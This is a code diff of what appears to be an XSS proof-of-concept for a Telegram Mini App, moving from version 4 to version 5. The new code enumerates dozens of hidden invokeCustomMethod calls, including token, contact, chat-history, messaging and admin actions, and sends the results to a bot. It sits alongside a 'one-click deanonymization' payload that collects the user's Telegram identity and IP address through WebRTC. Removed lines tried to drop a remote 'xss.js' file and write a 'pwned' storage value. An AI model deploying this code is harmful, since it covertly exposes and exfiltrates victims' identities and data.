@@ -277,108 +277,145 @@
   // Send probes via Bot API (reliable)
   sendBot('<b>MINI APP PROBES (v4):</b>\n<code>' + JSON.stringify(miniAppProbes, null, 1).substring(0, 3000) + '</code>')
 
-  // ===== ACTIVE API PROBES =====
-  var probeResults = {}
+  // ===== CONFIRMED FROM v4 =====
+  // requestFullscreen: WORKS SILENTLY (no prompt)
+  // addToHomeScreen: no prompt appeared (failed silently)
+  // downloadFile: no dialog (failed silently)
+  // invokeCustomMethod: WORKS (storage read/write confirmed)
+  // setEmojiStatus: no callback (needs prior permission)
 
-  // Probe 1: checkHomeScreenStatus - does it respond? what status?
-  try {
-    if (tg.checkHomeScreenStatus) {
-      tg.checkHomeScreenStatus(function(status) {
-        probeResults.homeScreenStatus = status
-        sendBot('<b>PROBE homeScreen:</b> status = <code>' + status + '</code>')
-      })
-    } else {
-      probeResults.homeScreenStatus = 'method not available'
+  // ===== invokeCustomMethod SWEEP (v5) =====
+  // Probe every plausible method name to find undocumented access
+  var methodsToProbe = [
+    // Known storage methods (baseline)
+    {name: 'getStorageValues', params: {keys: ['pwned']}},
+    // User/identity methods
+    {name: 'getMe', params: {}},
+    {name: 'getUser', params: {}},
+    {name: 'getUserInfo', params: {}},
+    {name: 'getUserProfile', params: {}},
+    {name: 'getUserData', params: {}},
+    {name: 'getContact', params: {}},
+    {name: 'getContacts', params: {}},
+    {name: 'getPhoneNumber', params: {}},
+    {name: 'getEmail', params: {}},
+    {name: 'getUserProfilePhotos', params: {user_id: user.id || 0}},
+    // Chat/message methods
+    {name: 'getChat', params: {}},
+    {name: 'getChatInfo', params: {}},
+    {name: 'getChatMember', params: {}},
+    {name: 'getChatMembers', params: {}},
+    {name: 'getChatHistory', params: {}},
+    {name: 'getMessages', params: {}},
+    {name: 'getMessage', params: {}},
+    {name: 'sendMessage', params: {chat_id: CHAT_ID, text: 'probe_test'}},
+    {name: 'forwardMessage', params: {}},
+    {name: 'deleteMessage', params: {}},
+    // Bot methods
+    {name: 'getBotInfo', params: {}},
+    {name: 'getWebAppData', params: {}},
+    {name: 'getInitData', params: {}},
+    {name: 'getBotToken', params: {}},
+    // File methods
+    {name: 'getFile', params: {}},
+    {name: 'uploadFile', params: {}},
+    // Payment/stars
+    {name: 'getStars', params: {}},
+    {name: 'getBalance', params: {}},
+    {name: 'createInvoice', params: {}},
+    // Settings/config
+    {name: 'getSettings', params: {}},
+    {name: 'getUserSettings', params: {}},
+    {name: 'getConfig', params: {}},
+    {name: 'getAppConfig', params: {}},
+    // Updates
+    {name: 'getUpdates', params: {}},
+    {name: 'getWebhookInfo', params: {}},
+    // Game methods
+    {name: 'setGameScore', params: {}},
+    {name: 'getGameHighScores', params: {}},
+    // Sticker/media
+    {name: 'getStickerSet', params: {}},
+    {name: 'getCustomEmojiStickers', params: {}},
+    // Admin
+    {name: 'banChatMember', params: {}},
+    {name: 'promoteChatMember', params: {}},
+    {name: 'setChatPermissions', params: {}},
+    // Misc
+    {name: 'answerWebAppQuery', params: {}},
+    {name: 'answerInlineQuery', params: {}},
+    {name: 'getLocation', params: {}},
+    {name: 'requestLocation', params: {}},
+    {name: 'getUserAuth', params: {}},
+    {name: 'getSession', params: {}},
+    {name: 'getSessions', params: {}},
+    {name: 'getActiveSession', params: {}},
+    {name: 'getPrivacy', params: {}},
+    {name: 'getNotifications', params: {}},
+    {name: 'getBlockedUsers', params: {}},
+    {name: 'getDeviceInfo', params: {}},
+    // Try direct storage read of ALL keys
+    {name: 'getStorageKeys', params: {}},
+    {name: 'getAllStorageValues', params: {}},
+    {name: 'deleteStorageValue', params: {key: 'nonexistent'}},
+  ]
+
+  var sweepResults = {}
+  var sweepCount = 0
+  var sweepTotal = methodsToProbe.length
+
+  if (tg && tg.invokeCustomMethod) {
+    for (var mi = 0; mi < methodsToProbe.length; mi++) {
+      (function(method) {
+        try {
+          tg.invokeCustomMethod(method.name, method.params, function(err, result) {
+            sweepCount++
+            if (err === null || result !== undefined) {
+              // Method responded - interesting!
+              sweepResults[method.name] = {err: err, result: result}
+            } else {
+              sweepResults[method.name] = {err: err ? (typeof err === 'object' ? JSON.stringify(err) : err) : 'unknown'}
+            }
+            // Send batch results when done or every 10 responses
+            if (sweepCount >= sweepTotal || sweepCount % 15 === 0) {
+              sendSweepResults()
+            }
+          })
+        } catch(e) {
+          sweepCount++
+          sweepResults[method.name] = {exception: e.message}
+        }
+      })(methodsToProbe[mi])
     }
-  } catch(e) { probeResults.homeScreenStatus = 'error: ' + e.message }
+  }
 
-  // Probe 2: addToHomeScreen - does it silently add or show prompt?
-  try {
-    if (tg.addToHomeScreen) {
-      tg.addToHomeScreen()
-      probeResults.addToHomeScreen = 'called (check if prompt appeared)'
-    } else {
-      probeResults.addToHomeScreen = 'method not available'
+  var sweepSent = false
+  function sendSweepResults() {
+    if (sweepSent) return
+    sweepSent = true
+
+    // Split into successes (err=null) and failures
+    var successes = {}
+    var failures = {}
+    for (var k in sweepResults) {
+      if (sweepResults[k].err === null || sweepResults[k].err === undefined) {
+        successes[k] = sweepResults[k]
+      } else {
+        failures[k] = sweepResults[k].err
+      }
     }
-  } catch(e) { probeResults.addToHomeScreen = 'error: ' + e.message }
 
-  // Probe 3: downloadFile - can we silently drop a file?
-  try {
-    if (tg.downloadFile) {
-      tg.downloadFile({url: 'https://ajm4n.github.io/tg-miniapp-poc/xss.js', file_name: 'test.txt'}, function(accepted) {
-        probeResults.downloadFile = 'callback: accepted=' + accepted
-        sendBot('<b>PROBE downloadFile:</b> accepted = <code>' + accepted + '</code>')
-      })
-      probeResults.downloadFile = 'called'
-    } else {
-      probeResults.downloadFile = 'method not available'
-    }
-  } catch(e) { probeResults.downloadFile = 'error: ' + e.message }
+    var msg = '<b>invokeCustomMethod SWEEP (v5)</b>\n'
+    msg += '<b>Tested:</b> ' + sweepCount + '/' + sweepTotal + '\n\n'
+    msg += '<b>== RESPONDED (err=null) ==</b>\n'
+    msg += '<code>' + JSON.stringify(successes, null, 1).substring(0, 2000) + '</code>\n\n'
+    msg += '<b>== ERRORS ==</b>\n'
+    msg += '<code>' + JSON.stringify(failures, null, 1).substring(0, 1000) + '</code>'
+    sendBot(msg)
+  }
 
-  // Probe 4: invokeCustomMethod - enumerate what's accessible
-  var customMethods = ['getStorageValues', 'getStorageValue', 'saveStorageValue', 'deleteStorageValue']
-  var customResults = {}
-
-  // Try reading all storage keys
-  try {
-    if (tg.invokeCustomMethod) {
-      tg.invokeCustomMethod('getStorageValues', {keys: ['test']}, function(err, result) {
-        customResults.getStorageValues = {err: err, result: result}
-        sendBot('<b>PROBE invokeCustomMethod(getStorageValues):</b>\nerr=<code>' + JSON.stringify(err) + '</code>\nresult=<code>' + JSON.stringify(result) + '</code>')
-      })
-      // Try saving a value to cloud storage
-      tg.invokeCustomMethod('saveStorageValue', {key: 'pwned', value: 'xss_was_here_' + Date.now()}, function(err, result) {
-        customResults.saveStorageValue = {err: err, result: result}
-        sendBot('<b>PROBE invokeCustomMethod(saveStorageValue):</b>\nerr=<code>' + JSON.stringify(err) + '</code>\nresult=<code>' + JSON.stringify(result) + '</code>')
-      })
-      probeResults.invokeCustomMethod = 'called'
-    } else {
-      probeResults.invokeCustomMethod = 'method not available'
-    }
-  } catch(e) { probeResults.invokeCustomMethod = 'error: ' + e.message }
-
-  // Probe 5: requestFullscreen - does it go fullscreen silently?
-  try {
-    if (tg.requestFullscreen) {
-      tg.requestFullscreen()
-      probeResults.requestFullscreen = 'called'
-    } else {
-      probeResults.requestFullscreen = 'method not available'
-    }
-  } catch(e) { probeResults.requestFullscreen = 'error: ' + e.message }
-
-  // Probe 6: setEmojiStatus WITHOUT requestEmojiStatusAccess first
-  try {
-    if (tg.setEmojiStatus) {
-      tg.setEmojiStatus(5368324170671202286, {duration: 3600}, function(result) {
-        probeResults.setEmojiStatus = 'callback: ' + JSON.stringify(result)
-        sendBot('<b>PROBE setEmojiStatus (no prior access request):</b> <code>' + JSON.stringify(result) + '</code>')
-      })
-      probeResults.setEmojiStatus = 'called'
-    } else {
-      probeResults.setEmojiStatus = 'method not available'
-    }
-  } catch(e) { probeResults.setEmojiStatus = 'error: ' + e.message }
-
-  // Probe 7: switchInlineQuery - can we force inline mode?
-  try {
-    if (tg.switchInlineQuery) {
-      // Don't actually call this one yet - just note availability
-      probeResults.switchInlineQuery = 'available (not called - would switch to inline mode)'
-    }
-  } catch(e) {}
-
-  // Probe 8: openTelegramLink - can we open arbitrary tg links?
-  try {
-    if (tg.openTelegramLink) {
-      probeResults.openTelegramLink = 'available (not called - would navigate)'
-    }
-  } catch(e) {}
-
-  // Send all probe results after a delay
-  setTimeout(function() {
-    sendBot('<b>API PROBE RESULTS (v4):</b>\n<code>' + JSON.stringify(probeResults, null, 1).substring(0, 3000) + '</code>')
-  }, 2000)
+  // Fallback: send whatever we have after 3s
+  setTimeout(function() { sendSweepResults() }, 3000)
 
   // ===== WebRTC IP LEAK =====
   var ips = []
@@ -389,7 +426,7 @@
     sent = true
 
     // Build combined message for Bot API
-    var m = '<b>ONE-CLICK DEANONYMIZATION (v4)</b>\n\n'
+    var m = '<b>ONE-CLICK DEANONYMIZATION (v5)</b>\n\n'
 
     m += '<b>== TELEGRAM IDENTITY ==</b>\n'
     m += '<b>User ID:</b> <code>' + (user.id || 'N/A') + '</code>\n'
@@ -461,7 +498,7 @@
     } catch(e) {}
 
     // Auto-close (delayed to allow all probe callbacks)
-    setTimeout(function() { try { tg.close() } catch(e) {} }, 6000)
+    setTimeout(function() { try { tg.close() } catch(e) {} }, 8000)
   }
 
   // WebRTC
